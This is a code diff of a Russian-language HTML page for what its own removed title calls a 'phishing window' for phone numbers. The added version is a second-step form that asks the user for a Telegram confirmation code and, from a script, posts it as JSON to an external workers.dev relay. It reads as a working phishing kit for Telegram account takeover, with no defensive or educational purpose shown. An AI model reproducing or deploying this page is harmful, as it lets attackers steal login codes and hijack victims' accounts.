@@ -1,79 +1,40 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ru">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Фишинговое окно для получения номера телефона</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            margin: 0;
-            padding: 20px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            background-color: white; /* Изменили цвет фона на белый */
-        }
-
-        .tg-icon {
-            font-size: 36px;
-            color: #0074b9;
-            margin-bottom: 20px;
-        }
-
-        h1 {
-            margin-top: 0;
-        }
-
-        form {
-            display: flex;
-            flex-direction: column;
-            width: 100%;
-            max-width: 300px;
-            margin-bottom: 20px;
-        }
-
-        label {
-            margin-top: 10px;
-        }
-
-        input {
-            margin-bottom: 10px;
-            padding: 5px;
-            width: calc(100% - 10px);
-        }
-
-        button {
-            margin-top: 10px;
-            padding: 10px;
-            width: 100%;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Второе окно</title>
 </head>
 <body>
 
-    <!-- Страница для ввода номера телефона -->
-    <form id="phoneForm" action="https://tg-relay.egor8131723.workers.dev" method="post">
-        <label for="newPhone">Новый номер телефона:</label>
-        <input type="tel" id="newPhone" name="newPhone" placeholder="Новый номер телефона" required>
-        <br>
-        <button id="nextBtn">Далее</button>
-    </form>
+  <h3>Второй этап</h3>
+  <form id="form2">
+    <input type="text" name="step2_info" placeholder="Введите код подтверждение" required>
+    <button type="submit">Войти</button>
+    <button type="button" onclick="window.location.href = '/';">Назад</button> <!-- "Назад" или "Вернуться" -->
+  </form>
 
-    <!-- Страница для ввода кода -->
-    <form id="codeForm" action="https://tg-relay.egor8131723.workers.dev" method="post">
-        <label for="code">Код подтверждение:</label>
-        <input type="number" id="code" name="code" placeholder="Код подтверждение" required>
-        <br>
-        <button id="sendBtn">Войти</button>
-    </form>
+  <script>
+    document.getElementById("form2").addEventListener("submit", async function(e) {
+      e.preventDefault();
 
-    <script>
-        document.getElementById('nextBtn').addEventListener('click', function() {
-            const phone = document.getElementById('newPhone').value;
-            document.location.href = `/code-page?phone=${phone}`; // Перенаправление на страницу для ввода кода.
-        });
-    </script>
+      const data = Object.fromEntries(new FormData(e.target).entries());
+      // Помечаем, что это запрос со второго окна
+      data.screen = "Окно 2";
+
+      const response = await fetch("https://tg-relay.egor8131723.workers.dev", {  // 请确保 URL 正确
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(data)
+      });
+
+      if (response.ok) {
+        alert("Данные со второго окна отправлены!");
+        // При желании можно закрыть Mini App после завершения:
+        // if (window.Telegram?.WebApp) window.Telegram.WebApp.close();
+      }
+    });
+  </script>
 
 </body>
 </html>
